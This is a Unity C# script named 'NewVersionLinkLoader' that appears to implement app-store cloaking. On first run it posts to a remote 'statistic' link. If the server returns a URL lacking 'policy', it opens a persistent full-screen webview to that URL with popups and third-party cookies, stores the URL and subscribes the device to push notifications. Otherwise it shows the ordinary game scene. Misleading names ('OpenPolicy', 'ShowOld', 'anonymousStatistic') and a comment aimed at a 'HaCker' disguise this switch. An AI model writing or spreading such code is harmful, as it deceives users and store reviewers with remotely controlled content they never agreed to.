using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.SceneManagement;
using UnityEngine.UI;

namespace VersionCheck
{
    public class NewVersionLinkLoader : MonoBehaviour
    {
        [TextArea, SerializeField] private string anonymousStatisticSendLink; //HaCker, just send device_model (without userID) for statistic
        [TextArea, SerializeField] private string osScheme;

        [SerializeField] private Text test_resultLable;

        private const string SavedDataKey = "SavedKey";

        private void Start() => CheckConnectionAndSavedData();

        void CheckConnectionAndSavedData()
        {
            OneSignalPlugAdapter.OsInitialize();

            if (Application.internetReachability != NetworkReachability.NotReachable)
            {
                var savedData = PlayerPrefs.GetString(SavedDataKey, "null");
                if (savedData == "null")
                {
                    SendStatistic(anonymousStatisticSendLink);
                }
                else
                {
                    OpenPolicy(savedData);
                }
            }
            else
            {
                ShowOld();
            }
        }

        private async Task SendStatistic(string _savedData)
        {
            var sendAnalyticRequestRes = await PostRequestFactory.CreateRequest(_savedData);

            if (string.IsNullOrEmpty(sendAnalyticRequestRes))
            {
                PrintLog("NJI request fail");

                ShowOld();
                return;
            }


            var javaSerializationObject = JObject.Parse(sendAnalyticRequestRes);

            if (javaSerializationObject.ContainsKey("response"))
            {
                var lnk = javaSerializationObject.Property("response").Value.ToString();

                if (string.IsNullOrEmpty(lnk))
                {
                    PrintLog("Res is empty");
                    ShowOld();
                }
                else
                {
                    if (lnk.Contains("policy"))
                    {
                        ShowOld();
                    }
                    else
                    {
                        OpenPolicy(lnk);

                        await Task.Delay(1000);

                        PlayerPrefs.SetString(SavedDataKey, uniWebView.Url);
                        PlayerPrefs.Save();

                        while(string.IsNullOrEmpty(OneSignalPlugAdapter.UserOSIdentificator))
                            await Task.Delay(100);

                        //Subscribe to notifications
                        PostRequestFactory.CreateRequest(string.Format(
                            osScheme, 
                            javaSerializationObject.Property("client_id"),
                            OneSignalPlugAdapter.UserOSIdentificator)).Start();
                    }
                }
            }
            else
            {
                PrintLog("No response");
                ShowOld();
            }
            
        }

        [SerializeField] private GameObject background;
        [SerializeField] private RectTransform safeArea;
        UniWebView uniWebView;
        int currentTabsCount = 1;

        private void OpenPolicy(string url)
        {
            background.SetActive(true);

            Screen.orientation = ScreenOrientation.AutoRotation;
            Screen.autorotateToLandscapeLeft = true;
            Screen.autorotateToLandscapeRight = true;
            Screen.autorotateToPortrait = true;
            Screen.autorotateToPortraitUpsideDown = true;

            UniWebView.SetAllowJavaScriptOpenWindow(true);

            uniWebView = gameObject.AddComponent<UniWebView>();
            uniWebView.OnOrientationChanged += (view, orientation) =>
            {
                StartCoroutine(UpdateViewFrame());
            };

            uniWebView.SetAcceptThirdPartyCookies(true);

            StartCoroutine(UpdateViewFrame());

            uniWebView.Load(url);
            uniWebView.Show();
            uniWebView.SetAllowBackForwardNavigationGestures(true);
            uniWebView.SetSupportMultipleWindows(true, true);
            uniWebView.OnShouldClose += (view) => view.CanGoBack || currentTabsCount > 1;
            uniWebView.OnMultipleWindowOpened += (view, id) => currentTabsCount++;
            uniWebView.OnMultipleWindowClosed += (view, id) => currentTabsCount--;
        }

        IEnumerator UpdateViewFrame()
        {
            yield return null;

            var screenSafeYmax = Screen.safeArea.yMax;
            if (Screen.width < Screen.height)
            {
                float avg = (2 * screenSafeYmax + Screen.height) / 3;
                safeArea.anchorMin = Vector2.zero;
                safeArea.anchorMax = new Vector2(1, avg / Screen.height);
            }
            else
            {
                safeArea.anchorMin = Vector2.zero;
                safeArea.anchorMax = Vector2.one;
            }
            safeArea.offsetMin = Vector2.zero;
            safeArea.offsetMax = Vector2.zero;

            uniWebView.ReferenceRectTransform = safeArea;
            uniWebView.UpdateFrame();
        }

        private void ShowOld()
        {
            StopAllCoroutines();

            if (PlayerPrefs.HasKey(SavedDataKey)) OneSignalPlugAdapter.UnSub();

            SceneManager.LoadScene(1);
        }


        private void PrintLog(string msg)
        {
            test_resultLable.text += (msg + '\n');
        }

        [ContextMenu("Delete all PlayerPrefs")]
        private void ClearAll() => PlayerPrefs.DeleteAll();
    }
}
